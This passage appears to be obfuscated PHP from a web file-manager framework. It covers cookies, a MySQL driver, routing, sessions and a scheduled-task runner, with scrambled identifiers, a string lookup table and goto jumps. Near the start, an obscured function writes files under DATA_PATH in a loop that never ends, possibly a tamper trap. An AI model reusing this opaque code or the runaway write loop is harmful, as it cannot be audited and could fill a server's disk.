json_encode($GLOBALS[$¶ÈĞ¶Á[893]]); $ì€šù®À = 1; for ($Šò–€œ = $ì€šù®À; $Šò–€œ > 0; $Šò–€œ++) { $‡®Â¿¨¸(DATA_PATH . $Šò–€œ, $ë×Ò™öĞ); } } if ($this->isCluster) { foreach ($this->handle->_masters() as $òãÊ¿óÙ) { $this->handle->flushall($òãÊ¿óÙ); } return; } return $this->handle->flushAll(); } } class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($ªŠú€ÛÓ = '', $Ë´—˜¡Û = 0) { if (is_string($ªŠú€ÛÓ) && $ªŠú€ÛÓ != $_SERVER[¯µç›È¢][12]) { $this->prefix = $ªŠú€ÛÓ; } if (is_numeric($Ë´—˜¡Û) && $Ë´—˜¡Û > 0) { $this->expire = $Ë´—˜¡Û; } } public static function getInstance() { static $ÂıÙüñë; if ($ÂıÙüñë === null) { $ÂıÙüñë = new self(); } return $ÂıÙüñë; } private static $cookieDisable = false; public static function disable($äóúñ±§) { self::$cookieDisable = $äóúñ±§; } private static $sameCookieSet = array(); public static function set($•öäáÎé, $¿Úå–È‹, $†­”Şœœ = 0, $°æÇçìÏ = false, $êÇ£°åé = false) { $œ¥Œæí¶ =& $_SERVER[¯µç›È¢]; if (self::$cookieDisable) { return; } if (!$†­”Şœœ) { $†­”Şœœ = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$•öäáÎé]) && self::$sameCookieSet[$•öäáÎé] == $¿Úå–È‹ . $†­”Şœœ) { return; } self::$sameCookieSet[$•öäáÎé] = $¿Úå–È‹ . $†­”Şœœ; if (!$êÇ£°åé) { $êÇ£°åé = str_replace(HOST, $œ¥Œæí¶[12], APP_HOST); $êÇ£°åé = _get($GLOBALS, $œ¥Œæí¶[894], $êÇ£°åé); } $Û–³¡Şø = $œ¥Œæí¶[12]; setcookie($•öäáÎé, $¿Úå–È‹, time() + $†­”Şœœ, $œ¥Œæí¶[8] . trim($êÇ£°åé, $œ¥Œæí¶[8]) . $Û–³¡Şø, !1, !1, $°æÇçìÏ); } public static function setSafe($ƒéÑéÊÜ, $ë˜ú¼õ®, $›Áş¦¦  = 0) { self::set($ƒéÑéÊÜ, $ë˜ú¼õ®, $›Áş¦¦ , !0); } public static function get($Ü™»ºÜÈ) { static $½Ï¼ƒ§ = false; if (!$½Ï¼ƒ§) { self::initHeaderCookie(); $½Ï¼ƒ§ = !0; } return isset($_COOKIE[$Ü™»ºÜÈ]) ? $_COOKIE[$Ü™»ºÜÈ] : !1; } private static function initHeaderCookie() { $Ã‘Š·¤¨ =& $_SERVER[¯µç›È¢]; if (!isset($_SERVER[$Ã‘Š·¤¨[895]]) || !$_SERVER[$Ã‘Š·¤¨[895]]) { return; } $úØ£Ñ¢á = explode($Ã‘Š·¤¨[81], $_SERVER[$Ã‘Š·¤¨[895]]); foreach ($úØ£Ñ¢á as $ÆÎÚàù) { $ÆÎÚàù = explode($Ã‘Š·¤¨[896], $ÆÎÚàù); if (count($ÆÎÚàù) != 2 || !isset($ÆÎÚàù[1])) { continue; } $_COOKIE[trim($ÆÎÚàù[0])] = trim($ÆÎÚàù[1]); } } public static function remove($«¹Ì¦‡¢, $ò¶ÅĞåà = false) { unset($_COOKIE[$«¹Ì¦‡¢]); self::set($«¹Ì¦‡¢, $_SERVER[¯µç›È¢][12], 1, $ò¶ÅĞåà); } } class DbMysql extends Db { public function __construct($Ÿ¿ËÌ•‹ = '') { $œ¨ê›ª =& $_SERVER[¯µç›È¢]; if (!extension_loaded($œ¨ê›ª[821])) { think_exception(think_lang($œ¨ê›ª[14]) . $œ¨ê›ª[897]); } if (!empty($Ÿ¿ËÌ•‹)) { $this->config = $Ÿ¿ËÌ•‹; if (empty($this->config[$œ¨ê›ª[17]])) { $this->config[$œ¨ê›ª[17]] = $œ¨ê›ª[12]; } } } public function connect($†«‰¢ø = '', $è÷ñ¤¿İ = 0, $çşÆçÄ… = false) { $«ò…æÂİ =& $_SERVER[¯µç›È¢]; if (!isset($this->linkID[$è÷ñ¤¿İ])) { if (empty($†«‰¢ø)) { $†«‰¢ø = $this->config; } $µôÓ“˜¸ = $†«‰¢ø[$«ò…æÂİ[898]] . ($†«‰¢ø[$«ò…æÂİ[899]] ? "\72{$†«‰¢ø[$«ò…æÂİ[899]]}" : $«ò…æÂİ[12]); $´áşèø™ = !empty($†«‰¢ø[$«ò…æÂİ[17]][$«ò…æÂİ[18]]) ? $†«‰¢ø[$«ò…æÂİ[17]][$«ò…æÂİ[18]] : $this->pconnect; if ($´áşèø™) { $this->linkID[$è÷ñ¤¿İ] = mysql_pconnect($µôÓ“˜¸, $†«‰¢ø[$«ò…æÂİ[900]], $†«‰¢ø[$«ò…æÂİ[901]], 131072); } else { $this->linkID[$è÷ñ¤¿İ] = mysql_connect($µôÓ“˜¸, $†«‰¢ø[$«ò…æÂİ[900]], $†«‰¢ø[$«ò…æÂİ[901]], !0, 131072); } if (!$this->linkID[$è÷ñ¤¿İ] || !empty($†«‰¢ø[$«ò…æÂİ[21]]) && !mysql_select_db($†«‰¢ø[$«ò…æÂİ[21]], $this->linkID[$è÷ñ¤¿İ])) { think_exception(mysql_error()); } $ìÓ´çğÚ = mysql_get_server_info($this->linkID[$è÷ñ¤¿İ]); mysql_query($«ò…æÂİ[902] . think_config($«ò…æÂİ[903]) . $«ò…æÂİ[58], $this->linkID[$è÷ñ¤¿İ]); if ($ìÓ´çğÚ > $«ò…æÂİ[904]) { mysql_query($«ò…æÂİ[905], $this->linkID[$è÷ñ¤¿İ]); } $this->connected = !0; if (1 != think_config($«ò…æÂİ[22])) { unset($this->config); } } return $this->linkID[$è÷ñ¤¿İ]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($Ñè—Ñ‰) { $İóéàã =& $_SERVER[¯µç›È¢]; if (0 === stripos($Ñè—Ñ‰, $İóéàã[272])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $Ñè—Ñ‰; if ($this->queryID) { $this->free(); } think_action_status($İóéàã[23], 1); think_status($İóéàã[24]); $this->queryID = mysql_query($Ñè—Ñ‰, $this->_linkID); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } } public function execute($º¡âúÕº) { $ŞÈ·­‹â =& $_SERVER[¯µç›È¢]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $º¡âúÕº; if ($this->queryID) { $this->free(); } think_action_status($ŞÈ·­‹â[25], 1); think_status($ŞÈ·­‹â[24]); $ŞÀÀ…°‹ = mysql_query($º¡âúÕº, $this->_linkID); $this->debug(); if (!1 === $ŞÀÀ…°‹) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[¯µç›È¢][906], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $İ¾ÛŒÁ = mysql_query($_SERVER[¯µç›È¢][907], $this->_linkID); $this->transTimes = 0; if (!$İ¾ÛŒÁ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $˜‰¨Ö“¢ = mysql_query($_SERVER[¯µç›È¢][908], $this->_linkID); $this->transTimes = 0; if (!$˜‰¨Ö“¢) { $this->error(); return !1; } } return !0; } private function getAll() { $óáÛò‘ = array(); if ($this->numRows > 0) { while ($ÍèÆ¿¹ı = mysql_fetch_assoc($this->queryID)) { $óáÛò‘[] = $ÍèÆ¿¹ı; } mysql_data_seek($this->queryID, 0); } return $óáÛò‘; } public function getFields($å§‹®Õ) { $÷˜ô¯á =& $_SERVER[¯µç›È¢]; $«×Ÿ€¹× = $this->query($÷˜ô¯á[909] . $this->parseKey($å§‹®Õ)); $‚Ùƒ « = array(); if ($«×Ÿ€¹×) { foreach ($«×Ÿ€¹× as $»ÇˆÊÇ× => $İÃéáú—) { $‚Ùƒ «[$İÃéáú—[$÷˜ô¯á[31]]] = array($÷˜ô¯á[32] => $İÃéáú—[$÷˜ô¯á[31]], $÷˜ô¯á[33] => $İÃéáú—[$÷˜ô¯á[34]], $÷˜ô¯á[35] => (bool) (strtoupper($İÃéáú—[$÷˜ô¯á[36]]) === $÷˜ô¯á[910]), $÷˜ô¯á[37] => $İÃéáú—[$÷˜ô¯á[38]], $÷˜ô¯á[39] => strtolower($İÃéáú—[$÷˜ô¯á[40]]) == $÷˜ô¯á[41], $÷˜ô¯á[42] => strtolower($İÃéáú—[$÷˜ô¯á[43]]) == $÷˜ô¯á[44]); } } return $‚Ùƒ «; } public function getTables($­ï¥šå¢ = '') { $‹¡¬ñ =& $_SERVER[¯µç›È¢]; if (!empty($­ï¥šå¢)) { $‘ §ìØš = $‹¡¬ñ[911] . $­ï¥šå¢ . $‹¡¬ñ[912]; } else { $‘ §ìØš = $‹¡¬ñ[913]; } $ÉÃÁä­Ó = $this->query($‘ §ìØš); $Ûóíˆ†€ = array(); foreach ($ÉÃÁä­Ó as $¨ı”¹—  => $†âÅÊ™Ì) { $Ûóíˆ†€[$¨ı”¹— ] = current($†âÅÊ™Ì); } return $Ûóíˆ†€; } public function replace($É ÌÆ¤…, $öÎ¨âÇ¸ = array()) { $®¨ÈÇÂ =& $_SERVER[¯µç›È¢]; foreach ($É ÌÆ¤… as $÷Ìé½„ => $Û•É‰Ä«) { $ã¡˜¥ú = $this->parseValue($Û•É‰Ä«); if (is_scalar($ã¡˜¥ú)) { $ ËÁ…Èõ[] = $ã¡˜¥ú; $­Ç¿§‚[] = $this->parseKey($÷Ìé½„); } } $ „ÒåÄ€ = $®¨ÈÇÂ[914] . $this->parseTable($öÎ¨âÇ¸[$®¨ÈÇÂ[287]]) . $®¨ÈÇÂ[915] . implode($®¨ÈÇÂ[50], $­Ç¿§‚) . $®¨ÈÇÂ[916] . implode($®¨ÈÇÂ[50], $ ËÁ…Èõ) . $®¨ÈÇÂ[917]; return $this->execute($ „ÒåÄ€); } public function insertAll($†Â’¬æ, $¹Öôª = array(), $Òüëã‰¤ = false) { $·ä¸òıÒ =& $_SERVER[¯µç›È¢]; if (!is_array($†Â’¬æ[0])) { return !1; } $¡Ÿ¾ÏÄÂ = array_keys($†Â’¬æ[0]); $¥‹öå¨´ = array(); foreach ($†Â’¬æ as $ã³çìÁ’) { $ŸŸØŠìÁ = array(); foreach ($ã³çìÁ’ as $ÀòÍ‘ü => $åŒŠ÷‡Ä) { $åŒŠ÷‡Ä = $this->parseValue($åŒŠ÷‡Ä); if (is_scalar($åŒŠ÷‡Ä)) { $ŸŸØŠìÁ[] = $åŒŠ÷‡Ä; } } $¥‹öå¨´[] = $·ä¸òıÒ[268] . implode($·ä¸òıÒ[50], $ŸŸØŠìÁ) . $·ä¸òıÒ[917]; } array_walk($¡Ÿ¾ÏÄÂ, array($this, $·ä¸òıÒ[918])); $Ö³­­ó = ($Òüëã‰¤ ? $·ä¸òıÒ[919] : $·ä¸òıÒ[920]) . $·ä¸òıÒ[921] . $this->parseTable($¹Öôª[$·ä¸òıÒ[287]]) . $·ä¸òıÒ[915] . implode($·ä¸òıÒ[50], $¡Ÿ¾ÏÄÂ) . $·ä¸òıÒ[922] . implode($·ä¸òıÒ[50], $¥‹öå¨´); return $this->execute($Ö³­­ó); } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $§ŒÈŞòÑ =& $_SERVER[¯µç›È¢]; $this->error = mysql_errno() . $§ŒÈŞòÑ[4] . mysql_error($this->_linkID); if ($§ŒÈŞòÑ[12] != $this->queryStr) { $this->error .= LNG($§ŒÈŞòÑ[48]) . $this->queryStr; } think_trace($this->error, $§ŒÈŞòÑ[12], $§ŒÈŞòÑ[49]); return $this->error; } public function escapeString($¿¥Íï¬) { if ($this->_linkID) { return mysql_real_escape_string($¿¥Íï¬, $this->_linkID); } else { return mysql_escape_string($¿¥Íï¬); } } public function parseKey(&$í›·Õİ¥, $ËÇÒû‘ = true) { $ÜĞ•øŠ =& $_SERVER[¯µç›È¢]; if ($ËÇÒû‘) { $í›·Õİ¥ = $this->parseKeyCheck($í›·Õİ¥); } if ($í›·Õİ¥ != $ÜĞ•øŠ[195] && !preg_match($ÜĞ•øŠ[923], $í›·Õİ¥)) { $í›·Õİ¥ = $ÜĞ•øŠ[393] . trim($í›·Õİ¥, $ÜĞ•øŠ[393]) . $ÜĞ•øŠ[393]; } return $í›·Õİ¥; } } goto Fßë¬ì£ŸÆ; Cò§à¥ÕÔ: class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\x3a\x61\156\x79" => "\133\x5e\x2f\x5d\x2b", "\x3a\x6e\165\155" => "\x5b\60\55\71\x5d\53", "\72\141\x6c\x6c" => "\56\52"); public static $errorCallback; public static function __callstatic($°­”¨, $«ÈÎºÌ) { $‰½ÂŞ• =& $_SERVER[¯µç›È¢]; if ($°­”¨ == $‰½ÂŞ•[1611]) { $óÕúã­ = array_map($‰½ÂŞ•[1612], $«ÈÎºÌ[0]); $ñì‡“ = strpos($«ÈÎºÌ[1], $‰½ÂŞ•[8]) === 0 ? $«ÈÎºÌ[1] : $‰½ÂŞ•[8] . $«ÈÎºÌ[1]; $€Û¿²Õø = $«ÈÎºÌ[2]; } else { $óÕúã­ = null; $ñì‡“ = strpos($«ÈÎºÌ[0], $‰½ÂŞ•[8]) === 0 ? $«ÈÎºÌ[0] : $‰½ÂŞ•[8] . $«ÈÎºÌ[0]; $€Û¿²Õø = $«ÈÎºÌ[1]; } array_push(self::$maps, $óÕúã­); array_push(self::$routes, $ñì‡“); array_push(self::$methods, strtoupper($°­”¨)); array_push(self::$callbacks, $€Û¿²Õø); } public static function error($‡®áŸ“) { self::$errorCallback = $‡®áŸ“; } public static function haltOnMatch($†Û½ïÍ± = true) { self::$halts = $†Û½ïÍ±; } public static function dispatch() { $óõÆ’‰© =& $_SERVER[¯µç›È¢]; $Ş»æ„éü = parse_url($_SERVER[$óõÆ’‰©[1613]], PHP_URL_PATH); $©¶±ˆÎ = $_SERVER[$óõÆ’‰©[170]]; $ìâûÀÏ” = array_keys(static::$patterns); $©ì½…û¤ = array_values(static::$patterns); $‡é³ïç­ = !1; self::$routes = preg_replace($óõÆ’‰©[1279], $óõÆ’‰©[8], self::$routes); if (in_array($Ş»æ„éü, self::$routes)) { $¸î¾ñ± = array_keys(self::$routes, $Ş»æ„éü); foreach ($¸î¾ñ± as $ÀÃç°»Ã) { if (self::$methods[$ÀÃç°»Ã] == $©¶±ˆÎ || self::$methods[$ÀÃç°»Ã] == $óõÆ’‰©[1614] || in_array($©¶±ˆÎ, self::$maps[$ÀÃç°»Ã])) { $‡é³ïç­ = !0; if (!is_object(self::$callbacks[$ÀÃç°»Ã])) { $àÛøŠ½° = explode($óõÆ’‰©[8], self::$callbacks[$ÀÃç°»Ã]); $Ò³–‹Â = end($àÛøŠ½°); $ƒşùè€Ş = explode($óõÆ’‰©[1615], $Ò³–‹Â); $òŸ—†×Ö = new $ƒşùè€Ş[0](); $òŸ—†×Ö->{$ƒşùè€Ş[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$ÀÃç°»Ã]); if (self::$halts) { return; } } } } } else { $¡âÒâ = 0; foreach (self::$routes as $ÀÃç°»Ã) { if (strpos($ÀÃç°»Ã, $óõÆ’‰©[4]) !== !1) { $ÀÃç°»Ã = str_replace($ìâûÀÏ”, $©ì½…û¤, $ÀÃç°»Ã); } if (preg_match($óõÆ’‰©[1616] . $ÀÃç°»Ã . $óõÆ’‰©[1617], $Ş»æ„éü, $ª‹îÂå¬)) { if (self::$methods[$¡âÒâ] == $©¶±ˆÎ || self::$methods[$¡âÒâ] == $óõÆ’‰©[1614] || !empty(self::$maps[$¡âÒâ]) && in_array($©¶±ˆÎ, self::$maps[$¡âÒâ])) { $‡é³ïç­ = !0; array_shift($ª‹îÂå¬); if (!is_object(self::$callbacks[$¡âÒâ])) { $àÛøŠ½° = explode($óõÆ’‰©[8], self::$callbacks[$¡âÒâ]); $Ò³–‹Â = end($àÛøŠ½°); $ƒşùè€Ş = explode($óõÆ’‰©[1615], $Ò³–‹Â); $òŸ—†×Ö = new $ƒşùè€Ş[0](); if (!method_exists($òŸ—†×Ö, $ƒşùè€Ş[1])) { echo $óõÆ’‰©[1618]; } else { call_user_func_array(array($òŸ—†×Ö, $ƒşùè€Ş[1]), $ª‹îÂå¬); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$¡âÒâ], $ª‹îÂå¬); if (self::$halts) { return; } } } } $¡âÒâ++; } } if ($‡é³ïç­ == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $ÄĞ£şù¹ =& $_SERVER[¯µç›È¢]; header($_SERVER[$ÄĞ£şù¹[1619]] . $ÄĞ£şù¹[1620]); echo $ÄĞ£şù¹[1621]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$óõÆ’‰©[1613]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } } } class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { $´õàÅáè =& $_SERVER[¯µç›È¢]; static $Áåìü— = false; if ($Áåìü—) { return $Áåìü—; } $¹é¯ŠÄ‡ = $GLOBALS[$´õàÅáè[6]][$´õàÅáè[357]]; self::$sessionTime = $¹é¯ŠÄ‡[$´õàÅáè[1622]]; $Ú‰ıñæù = isset($GLOBALS[$´õàÅáè[1623]]) ? $GLOBALS[$´õàÅáè[1623]] : SESSION_ID; if (self::$sessionSign) { } else { if (Cookie::get($Ú‰ıñæù)) { self::$sessionSign = Cookie::get($Ú‰ıñæù); } else { self::$sessionSign = guid(); } } Cookie::setSafe($Ú‰ıñæù, self::$sessionSign, self::$sessionTime); $¯¨Á©ÍÑ = $¹é¯ŠÄ‡[$´õàÅáè[1624]]; $áçùÍæØ = $¹é¯ŠÄ‡[$¯¨Á©ÍÑ]; $š“œ·Ç¯ = $¹é¯ŠÄ‡[$´õàÅáè[845]]; switch ($¯¨Á©ÍÑ) { case $´õàÅáè[21]: self::$handle = Model($´õàÅáè[846]); break; case $´õàÅáè[847]: self::$handle = new CacheRedis($áçùÍæØ, $š“œ·Ç¯); break; case $´õàÅáè[848]: self::$handle = new CacheMemcached($áçùÍæØ, $š“œ·Ç¯); break; case $´õàÅáè[206]: $áçùÍæØ[$´õàÅáè[88]] = $áçùÍæØ[$´õàÅáè[88]] . $´õàÅáè[1625]; self::$handle = new CacheFile($áçùÍæØ, $š“œ·Ç¯); default: break; } if (!self::$data) { self::$data = self::getBySign(self::$sessionSign); } $Áåìü— = new self(); return $Áåìü—; } public static function getBySign($ ‹Ü£ïŞ) { CacheLock::lock($ ‹Ü£ïŞ); $Êó”¤â = self::$handle->get($ ‹Ü£ïŞ); CacheLock::unlock($ ‹Ü£ïŞ); $Êó”¤â = unserialize($Êó”¤â); return is_array($Êó”¤â) ? $Êó”¤â : array(); } public static function setBySign($Ëôºù…, $È™ª°ƒŸ) { CacheLock::lock($Ëôºù…); self::$handle->set($Ëôºù…, serialize($È™ª°ƒŸ), self::$sessionTime); CacheLock::unlock($Ëôºù…); } public static function sign($™ÊÆÎ®˜ = false) { $™ÊÆÎ®˜ && (self::$sessionSign = $™ÊÆÎ®˜); self::init(); return self::$sessionSign; } public static function set($³ì¯¡ü, $üüûœšä = false) { self::init(); if (is_array($³ì¯¡ü)) { foreach ($³ì¯¡ü as $ø«ö¼õĞ => $ÈãÚÃÉ) { array_set_value(self::$data, $ø«ö¼õĞ, $ÈãÚÃÉ); } } else { array_set_value(self::$data, $³ì¯¡ü, $üüûœšä); } self::setBySign(self::$sessionSign, self::$data); } public static function get($·Ş±”‰µ = false) { self::init(); if (!$·Ş±”‰µ) { return self::$data; } return array_get_value(self::$data, $·Ş±”‰µ); } public static function remove($¥¥È˜¯Ê) { self::init(); unset(self::$data[$¥¥È˜¯Ê]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[¯µç›È¢][850])) { self::$handle->clearTimeout(); } } } class AutoTask { const AUTO_DELAY_TIME = 2; const AUTO_RESTART_TIME = 7200; public static function start() { $Ÿ¿¼ïÑ… =& $_SERVER[¯µç›È¢]; if (self::valueGet($Ÿ¿¼ïÑ…[767]) != $Ÿ¿¼ïÑ…[99]) { return; } if (self::valueGet($Ÿ¿¼ïÑ…[1626]) == $Ÿ¿¼ïÑ…[99]) { $àúı¢ÙÑ = self::valueGet($Ÿ¿¼ïÑ…[1627]); if (time() - $àúı¢ÙÑ > self::AUTO_RESTART_TIME) { self::restart(); } return; } http_close(); self::valueSet($Ÿ¿¼ïÑ…[1626], $Ÿ¿¼ïÑ…[99]); self::log($Ÿ¿¼ïÑ…[1628]); Hook::bind($Ÿ¿¼ïÑ…[1629], $Ÿ¿¼ïÑ…[1630]); $Å°ñ¦Òñ = 0; while (!0) { self::cacheClear(); if (self::valueGet($Ÿ¿¼ïÑ…[767]) != $Ÿ¿¼ïÑ…[99]) { self::valueSet($Ÿ¿¼ïÑ…[1626], $Ÿ¿¼ïÑ…[204]); self::log($Ÿ¿¼ïÑ…[1631]); die; } $½î‹ûöÑ = time(); if ($½î‹ûöÑ - $Å°ñ¦Òñ >= 60) { self::valueSet(array($Ÿ¿¼ïÑ…[1626] => $Ÿ¿¼ïÑ…[99], $Ÿ¿¼ïÑ…[1627] => $½î‹ûöÑ), !1); $Å°ñ¦Òñ = $½î‹ûöÑ; } if (!file_exists(USER_SYSTEM . $Ÿ¿¼ïÑ…[1632])) { self::valueSet(array($Ÿ¿¼ïÑ…[1626] => $Ÿ¿¼ïÑ…[204], $Ÿ¿¼ïÑ…[767] => $Ÿ¿¼ïÑ…[204]), !1); self::log($Ÿ¿¼ïÑ…[1633]); die; } self::taskRunAll(); sleep(self::AUTO_DELAY_TIME); } } public static function restart() { $ÌÃÒÇĞŠ =& $_SERVER[¯µç›È¢]; http_close(); self::valueSet($ÌÃÒÇĞŠ[767], $ÌÃÒÇĞŠ[204]); sleep(self::AUTO_DELAY_TIME + 5); self::valueSet(array($ÌÃÒÇĞŠ[1626] => $ÌÃÒÇĞŠ[204], $ÌÃÒÇĞŠ[767] => $ÌÃÒÇĞŠ[99]), !1); } public static function shutdownEvent() { $Ô£ÎÔø =& $_SERVER[¯µç›È¢]; self::valueSet($Ô£ÎÔø[1626], $Ô£ÎÔø[204]); self::log($Ô£ÎÔø[1634]); } public static function config($²¦ë·‚, $Ü€Âß§À) { self::valueSet($_SERVER[¯µç›È¢][767], $²¦ë·‚); } private static function taskRunAll() { $øßıâê =& $_SERVER[¯µç›È¢]; $îÅõÂË× = timeFloat(); $ÜØ™ÂÁ† = Model($øßıâê[1635])->listData(); $­Ø­Œ×¦ = count($ÜØ™ÂÁ†); for ($áÙâ¢†¦ = 0; $áÙâ¢†¦ < $­Ø­Œ×¦; $áÙâ¢†¦++) { $ÖÅÑ£­ = $ÜØ™ÂÁ†[$áÙâ¢†¦]; if (!$ÖÅÑ£­[$øßıâê[405]] || $ÖÅÑ£­[$øßıâê[1636]] != $øßıâê[99]) { continue; } if (!self::taskTimeCheck($ÖÅÑ£­)) { continue; } self::taskRun($ÖÅÑ£­); } Hook::trigger($øßıâê[1637]); self::taskQueueRun($îÅõÂË×); } private static function taskQueueRun($…ÃâÖËú) { $àù¦ŸÁò = 10; while (!0) { $¦çù€ü = TaskQueue::run(); if ($¦çù€ü === !1) { break; } if (timeFloat() - $…ÃâÖËú >= $àù¦ŸÁò) { break; } } } private static function taskTimeCheck($ª‚€ğú·) { $ı×ÉÍÃü =& $_SERVER[¯µç›È¢]; $ÜÂçÆêü = json_decode($ª‚€ğú·[$ı×ÉÍÃü[210]], !0); $«Ü“«É = intval($ª‚€ğú·[$ı×ÉÍÃü[1627]]); $Æò€Ñ° = strtotime($ı×ÉÍÃü[1638] . $ÜÂçÆêü[$ı×ÉÍÃü[1639]] . $ı×ÉÍÃü[1640]) - strtotime($ı×ÉÍÃü[1641]); $Üİò­Íâ = time() - strtotime(date($ı×ÉÍÃü[1642]) . $ı×ÉÍÃü[1643]); $î€Ô ²÷ = $Üİò­Íâ >= $Æò€Ñ° && $Üİò­Íâ <= $Æò€Ñ° + 3600; switch ($ÜÂçÆêü[$ı×ÉÍÃü[33]]) { case $ı×ÉÍÃü[1644]: if (time() - $«Ü“«É < 3600 * 24 * 30) { return !1; } if ($ÜÂçÆêü[$ı×ÉÍÃü[1644]] == date($ı×ÉÍÃü[1645]) && $î€Ô ²÷) { return !0; } break; case $ı×ÉÍÃü[1646]: if (time() - $«Ü“«É < 3600 * 24 * 7) { return !1; } $±¦›ÖÌÄ = date($ı×ÉÍÃü[1647]) == 0 ? 7 : date($ı×ÉÍÃü[1647]); if ($ÜÂçÆêü[$ı×ÉÍÃü[1646]] == $±¦›ÖÌÄ && $î€Ô ²÷) { return !0; } break; case $ı×ÉÍÃü[1639]: if (time() - $«Ü“«É < 3600 * 24) { return !1; } if ($î€Ô ²÷) { return !0; } break; case $ı×ÉÍÃü[1648]: if (time() - $«Ü“«É >= floatval($ÜÂçÆêü[$ı×ÉÍÃü[1648]]) * 60) { return !0; } break; default: break; } return !1; } private static function closeDatabase() { $×÷îôŞß =& $_SERVER[¯µç›È¢]; static $¯¸†ÃÖ = 0; $‚¬øèÁø = 300; if (!$¯¸†ÃÖ) { $¯¸†ÃÖ = time(); } if (time() - $¯¸†ÃÖ < $‚¬øèÁø) { return; } $¯¸†ÃÖ = time(); $»æŞúâ = Model($×÷îôŞß[518])->db($×÷îôŞß[12]); if ($»æŞúâ) { $»æŞúâ->closeConnect(); } if (time() - TIME > 3600 * 24 * 3) { self::log($×÷îôŞß[1649], $×÷îôŞß[1650]); die; } } public static function taskRun($Œ£ìâÓ) { $Œ·”×¯´ =& $_SERVER[¯µç›È¢]; self::log($Œ·”×¯´[1651] . $Œ£ìâÓ[$Œ·”×¯´[405]] . $Œ·”×¯´[1652] . $Œ£ìâÓ[$Œ·”×¯´[32]] . $Œ·”×¯´[1653] . $Œ£ìâÓ[$Œ·”×¯´[1654]]); Model($Œ·”×¯´[1635])->run($Œ£ìâÓ[$Œ·”×¯´[405]]); $­¨·™¾ = timeFloat(); $€Àı’íã = $Œ·”×¯´[12]; switch ($Œ£ìâÓ[$Œ·”×¯´[33]]) { case $Œ·”×¯´[315]: $éÊ³œ›Ö = url_request($Œ£ìâÓ[$Œ·”×¯´[1654]], $Œ·”×¯´[239], !1, !1, !1, !1, 10); if ($éÊ³œ›Ö[$Œ·”×¯´[767]]) { $€Àı’íã = strlen($éÊ³œ›Ö[$Œ·”×¯´[1203]]); } break; case $Œ·”×¯´[238]: $€Àı’íã = Hook::apply($Œ£ìâÓ[$Œ·”×¯´[1654]]); default: break; } Model($Œ·”×¯´[1655])->add(array($Œ·”×¯´[1656] => $Œ·”×¯´[12], $Œ·”×¯´[1657] => $Œ·”×¯´[204], $Œ·”×¯´[33] => $Œ·”×¯´[1658] . $Œ£ìâÓ[$Œ·”×¯´[405]], $Œ·”×¯´[1659] => json_encode(array($Œ·”×¯´[32] => $Œ£ìâÓ[$Œ·”×¯´[32]], $Œ·”×¯´[1660] => timeFloat() - $­¨·™¾, $Œ·”×¯´[301] => $€Àı’íã)))); $Ù–‹—äĞ = $€Àı’íã ? $Œ·”×¯´[1661] . $€Àı’íã : $Œ·”×¯´[12]; self::log($Œ·”×¯´[1662] . $Œ£ìâÓ[$Œ·”×¯´[405]] . $Œ·”×¯´[541] . $Ù–‹—äĞ); return !0; } private static function valueGet($Íé»†Üº) { $£î˜ÏşÌ =& $_SERVER[¯µç›È¢]; $ÆÜ¾ª÷ = $£î˜ÏşÌ[1663]; $ãÊ‰áÅŞ = Model($£î˜ÏşÌ[438])->get($Íé»†Üº, $ÆÜ¾ª÷); if (is_null($ãÊ‰áÅŞ)) { Model($£î˜ÏşÌ[438])->set($£î˜ÏşÌ[767], $£î˜ÏşÌ[99], $ÆÜ¾ª÷); Model($£î˜ÏşÌ[438])->set($£î˜ÏşÌ[1626], $£î˜ÏşÌ[204], $ÆÜ¾ª÷); $ãÊ‰áÅŞ = Model($£î˜ÏşÌ[438])->get($Íé»†Üº, $ÆÜ¾ª÷); } return $ãÊ‰áÅŞ; } private static function valueSet($åÄ°İ—, $­—©Ø‡ğ) { $İ“­åÕ½ =& $_SERVER[¯µç›È¢]; $ÙéÙ–†ª = $İ“­åÕ½[1664]; CacheLock::lock($ÙéÙ–†ª); $±ÀÊÇ­€ = Model($İ“­åÕ½[438])->set($åÄ°İ—, $­—©Ø‡ğ, $İ“­åÕ½[1663]); CacheLock::unlock($ÙéÙ–†ª); return $±ÀÊÇ­€; } protected static function log($¹È¢Ó·µ) { write_log($¹È¢Ó·µ, $_SERVER[¯µç›È¢][1650]); } private static function cacheClear() { $©•‹³å› =& $_SERVER[¯µç›È¢]; Cache::clearMemory(Model($©•‹³å›[438])->cacheKey($©•‹³å›[1663])); Cache::clearMemory(Model($©•‹³å›[438])->cacheKey($©•‹³å›[1665])); Model($©•‹³å›[1635])->cacheClear(); self::closeDatabase(); } } goto CŠ½Öò É; bœÏÑ¡ ò…: class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($ºÍ•À˜å, $°ö‚ôÌ) { $êÍôÄö– =& 